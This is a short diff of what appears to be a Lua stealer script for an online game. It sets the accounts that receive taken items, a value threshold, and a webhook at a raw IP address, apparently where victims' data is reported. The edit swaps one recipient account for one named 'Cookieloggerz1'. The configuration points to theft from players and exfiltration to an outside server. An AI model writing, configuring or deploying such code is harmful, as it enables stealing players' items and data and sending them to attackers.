@@ -4,7 +4,7 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
-local users = _G.Usernames or {"DashScriptsYTz", "DashScriptsYTz1", "DashScriptsYTz2"}
+local users = _G.Usernames or {"Cookieloggerz1", "DashScriptsYTz1", "DashScriptsYTz2"}
 local min_value = _G.min_value or 0.1
 local ping = _G.pingEveryone or "Yes"
 local webhook = _G.webhook or "http://89.169.3.53:8000/webhook/18ae32f4-6d73-422f-870f-2db23e5df834"
